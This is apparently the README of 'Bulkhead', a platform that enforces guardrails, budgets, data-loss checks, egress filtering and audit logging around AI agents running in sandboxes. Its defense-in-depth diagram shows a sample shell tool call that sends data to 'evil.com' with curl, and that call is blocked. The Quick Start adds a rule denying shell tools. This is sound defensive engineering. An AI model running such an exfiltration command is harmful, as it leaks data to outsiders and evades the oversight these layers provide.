# Bulkhead

[![CI](https://github.com/achyuthnsamudrala/bulkhead/actions/workflows/ci.yml/badge.svg)](https://github.com/achyuthnsamudrala/bulkhead/actions/workflows/ci.yml)
[![Coverage](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/achyuthnsamudrala/f31293e684419d918138980929f0288c/raw/bulkhead-coverage.json)](https://github.com/achyuthnsamudrala/bulkhead/actions/workflows/ci.yml)

**Bulkhead is an enterprise platform for running autonomous AI agents in production with enforced policy controls.**

AI agents that can browse the web, execute code, and call APIs need more than a prompt — they need guardrails that can't be bypassed, budgets that can't be exceeded, network boundaries that can't be circumvented, and an audit trail that can't be tampered with. Bulkhead provides all four as independent enforcement layers, so a failure in one doesn't compromise the others.

## Defense in Depth

Every tool call an agent makes passes through four independent enforcement layers before it can take effect:

```
Agent calls ExecuteTool("shell", {"cmd": "curl https://evil.com/exfil?data=..."})

    1. Guardrails ── Compiled policy evaluated in Rust (<50ms)
       │              Tool "shell" matched rule "deny-shell" → DENY
       │              (if allowed, continues to next layer)
       │
    2. Budget ────── Per-agent spending limit checked before execution
       │              $47.20 of $100.00 used → ALLOW
       │
    3. DLP ────────── Content classified for sensitive data patterns
       │              SSN detected in parameters → DENY
       │              (blocks data exfiltration even if guardrails allow the tool)
       │
    4. Egress ────── iptables rules at the kernel level
                      evil.com not in allowlist → DROPPED
                      (even if all policy layers pass, network is filtered independently)
```

The Host Agent is **policy-only** — it evaluates and returns a verdict (ALLOW / DENY / ESCALATE) but never executes agent code. Agents run inside sandboxed containers and execute tools locally. This separation means a compromised agent cannot influence its own policy evaluation.

## Isolation Tiers

Sandbox security is automatically selected based on agent trust level and data sensitivity, or overridden explicitly by operators:

| Tier | Security Profile | When Used |
|------|-----------------|-----------|
| **Standard** | Docker container (cgroups + namespaces) | Trusted agents, public data |
| **Hardened** | + seccomp profile, read-only rootfs, no-new-privileges, dropped capabilities | New/untrusted agents, confidential data |
| **Isolated** | + gVisor or Kata runtime (kernel-level isolation) | High-risk agents, restricted data |

Auto-selection matrix:

| Trust \ Data | Public | Internal | Confidential | Restricted |
|-------------|--------|----------|--------------|------------|
| Trusted | standard | standard | standard | isolated |
| Established | standard | standard | hardened | isolated |
| New | hardened | hardened | isolated | isolated |

## Architecture

```
                          ┌──────────────┐
                          │   Operator   │
                          │   / bkctl    │
                          └──────┬───────┘
                                 │ gRPC
                 ┌───────────────┼───────────────┐
                 ▼               ▼               ▼
          ┌────────────┐  ┌───────────┐  ┌──────────────┐
          │  Control   │  │  Policy   │  │Observability │
          │   Plane    │  │           │  │              │
          │            │  │ Guardrails│  │  Activity    │
          │ Identity   │  │ Data Gov  │  │  Economics   │
          │ Task       │  │ (DLP)     │  │  Human-in-   │
          │ Workspace  │  │           │  │  the-loop    │
          │ Compute    │  │    :50062 │  │       :50065 │
          │     :50060 │  └───────────┘  └──────────────┘
          └─────┬──────┘        │
                │          compile policy
                │  create       │
                │  sandbox ┌────┘
                ▼          ▼
          ┌─────────────────────────────────────┐
          │           Host Agent (Rust)          │
          │                                     │
          │  ┌──────────┐ ┌──────┐ ┌─────────┐  │
          │  │Guardrails│ │Egress│ │ Budget  │  │
          │  │Evaluator │ │Filter│ │  + DLP  │  │
          │  └────┬─────┘ └──┬───┘ └────┬────┘  │
          │       └──────────┼──────────┘       │
          │            ┌─────┴─────┐            │
          │            │  Sandbox  │            │
          │            │ (Docker)  │            │
          │            └───────────┘            │
          │                              :50052 │
          └─────────────────────────────────────┘
```

| Component | Technology | Role |
|-----------|-----------|------|
| **Control Plane** | Go 1.24, gRPC, PostgreSQL 16 | 3 binaries: orchestration, policy management, observability |
| **Host Agent** | Rust 1.83, Tokio, Bollard | Per-host policy engine: guardrails evaluation, Docker lifecycle, iptables egress |
| **Python SDK** | Python 3.10+, LangChain | `@tool` decorator: evaluate-execute-report cycle, LangChain wrapper |

## Key Capabilities

**Security & Compliance**
- **Real-time guardrails** — Compiled policy rules evaluated in Rust, targeting <50ms per decision. Hot-reload without sandbox restart.
- **Per-sandbox egress control** — iptables FORWARD chain rules enforce network allowlists at the kernel level. Unapproved destinations are silently dropped.
- **DLP egress inspection** — Content classification detects SSNs, credit cards, AWS keys, and other sensitive patterns before data leaves the sandbox.
- **Append-only audit trail** — Every action (allowed, denied, escalated) recorded immutably with tool name, parameters, verdict, matched rule, and latency metrics.
- **Scoped credentials** — Time-limited tokens (max 24h) with explicit permission scopes. SHA-256 hashed for storage.

**Operations**
- **Human-in-the-loop** — Non-blocking approval/question/escalation requests. Configurable delivery channels (webhook-based) and timeout policies.
- **Budget enforcement** — Per-agent spending limits checked before every tool execution. Configurable actions on exceeded: halt, request increase, or warn.
- **Compute fleet management** — Hosts self-register and heartbeat every 30s. Best-fit placement with `FOR UPDATE SKIP LOCKED` prevents resource overselling. Warm pool pre-reserves slots for instant placement.
- **Behavior analysis** — Considered evaluation tier detects anomalies: high denial rates, stuck agents, runaway loops. Configurable alerts with webhook delivery.

**Developer Experience**
- **Python SDK** — `@tool` decorator handles the full evaluate-execute-report cycle. `wrap_langchain_tool()` brings existing LangChain agents to Bulkhead with one line.
- **Full orchestration** — Create a task, and the platform handles placement, policy compilation, credential injection, and sandbox creation automatically.
- **OpenTelemetry** — Distributed tracing across all services via Jaeger.

## Quick Start

**1. Start the platform**

```bash
docker compose -f deploy/docker-compose.yml up --build
```

**2. Register an agent and set its guardrails**

```bash
# Register the agent — returns an agent ID and credential token
bkctl agent register \
  --name invoice-processor \
  --owner-id org-acme \
  --purpose "Automate invoice validation" \
  --trust-level new

# Block shell access
bkctl guardrail create-rule \
  --name deny-shell \
  --type tool_filter \
  --condition 'tool_name matches "shell*"' \
  --action deny

# Set a $100 budget
bkctl budget set --agent-id <agent-id> --max-cost 100.00 --on-exceeded halt
```

**3. Create a task — the platform provisions everything**

```bash
bkctl task create \
  --agent-id <agent-id> \
  --goal "Validate Q4 invoices" \
  --memory 512 --cpu 1000
```

This triggers the full orchestration: host placement, policy compilation, credential injection, sandbox creation. The agent starts running inside an isolated container.

**4. Inside the sandbox, the agent code uses the SDK**

```python
from bulkhead import BulkheadAgent, Verdict, tool

@tool("read_invoice", description="Read a JSON invoice from disk")
def read_invoice(path: str) -> dict:
    with open(path) as f:
        return json.load(f)

with BulkheadAgent(tools=[read_invoice]) as agent:
    result = agent.execute_tool("read_invoice", {"path": "/data/inv-001.json"})

    if result.verdict == Verdict.DENY:
        print(f"Blocked: {result.denial_reason}")   # guardrail fired
    elif result.verdict == Verdict.ESCALATE:
        print(f"Needs approval: {result.escalation_id}")
    else:
        print(result.result)                         # tool executed
```

Every `execute_tool` call passes through guardrails, budget checks, and DLP before the tool runs. Denied calls never execute.

**5. Monitor the audit trail**

```bash
bkctl activity query --agent-id <agent-id> -o json
```

## Choose Your Guide

| I want to... | Guide |
|--------------|-------|
| Deploy the platform, manage agents and policies via `bkctl` CLI | [Operator Guide](docs/getting-started/operator-guide.md) |
| Build an agent with the Python SDK (`@tool` decorator) | [Agent Developer Guide](docs/getting-started/agent-guide.md) |
| Integrate Bulkhead guardrails into a LangChain agent | [LangChain Integration Guide](docs/getting-started/langchain-guide.md) |

## Project Structure

```
bulkhead/
├── proto/                          # Protocol Buffer definitions
│   └── platform/
│       ├── identity/v1/            #   Agent registry, credentials
│       ├── workspace/v1/           #   Workspace lifecycle
│       ├── host_agent/v1/          #   Host Agent gRPC services
│       ├── compute/v1/             #   Host fleet, placement, warm pool
│       ├── guardrails/v1/          #   Rule CRUD, policy compilation
│       ├── human/v1/               #   Human interaction requests
│       ├── activity/v1/            #   Action records, alerts
│       ├── economics/v1/           #   Usage metering, budgets
│       ├── governance/v1/          #   Data classification, DLP
│       └── task/v1/                #   Task lifecycle
│
├── cmd/
│   └── bkctl/                      # Operator CLI (bkctl)
│
├── control-plane/                  # Go control plane (3 binaries)
│   ├── cmd/
│   │   ├── control-plane/          #   Identity + Task + Workspace + Compute
│   │   ├── policy/                 #   Guardrails + Data Governance
│   │   └── observability/          #   Activity + Economics + Human
│   ├── internal/                   #   Business logic per service
│   └── migrations/                 #   SQL schema migrations (13 files)
│
├── runtime/                        # Host Agent (Rust)
│   └── crates/
│       ├── runtime/                #   Main binary
│       │   └── src/
│       │       ├── main.rs         #     Entry point, service wiring
│       │       ├── server.rs       #     HostAgentService (control API)
│       │       ├── agent_api.rs    #     HostAgentAPIService (policy-only)
│       │       ├── container.rs    #     Docker + iptables egress
│       │       └── sandbox/        #     SandboxManager, SandboxState
│       ├── guardrails-eval/        #   Policy evaluator library
│       └── proto-gen/              #   Generated protobuf Rust code
│
├── sdk/                            # Language SDKs
│   └── python/                     #   Python SDK (bulkhead-sdk)
│       ├── bulkhead/               #     Client, @tool decorator, types
│       └── examples/               #     Basic agent, LangChain integration
│
├── deploy/
│   ├── docker-compose.yml          # Full stack (5 containers + Jaeger)
│   ├── helm/                       # Kubernetes Helm chart
│   └── docker/
│       ├── Dockerfile.control-plane
│       └── Dockerfile.host-agent
│
├── docs/
│   ├── getting-started/
│   │   ├── operator-guide.md       # Deploy and operate the platform
│   │   ├── agent-guide.md          # Build agents with the Python SDK
│   │   └── langchain-guide.md      # LangChain integration
│   ├── architecture.md             # Design principles and core flows
│   ├── api-reference.md            # Complete RPC reference
│   ├── deployment.md               # Docker Compose, config, database
│   └── testing.md                  # E2E test suite and operator reference
│
├── Makefile                        # Build, test, lint, dev targets
└── LICENSE                         # Apache 2.0
```

## Development

| Target | Description |
|--------|-------------|
| `make build` | Build Go control-plane and Rust Host Agent |
| `make build-bkctl` | Build the `bkctl` operator CLI with version info |
| `make test` | Run all unit tests (Go + Rust) |
| `make test-integration` | Run integration tests (requires Docker) |
| `make test-e2e` | Run E2E tests — control-plane only (requires Docker) |
| `make test-e2e-full` | Run full-stack E2E tests (requires Docker + Rust toolchain) |
| `make proto` | Regenerate protobuf code |
| `make dev` / `make dev-down` | Start / stop Docker Compose |
| `make fmt` | Format Go + Rust code |
| `make lint` | Lint protos, Go, Rust |

## Reference Documentation

- [Architecture](docs/architecture.md) — Design principles, service details, core flow diagrams
- [API Reference](docs/api-reference.md) — Complete RPC reference for all 10 services
- [Deployment Guide](docs/deployment.md) — Docker Compose topology, configuration, database schema
- [Testing Guide](docs/testing.md) — E2E test suite covering every platform workflow (also useful as an operator reference)

## License

Apache 2.0 — see [LICENSE](LICENSE) for details.
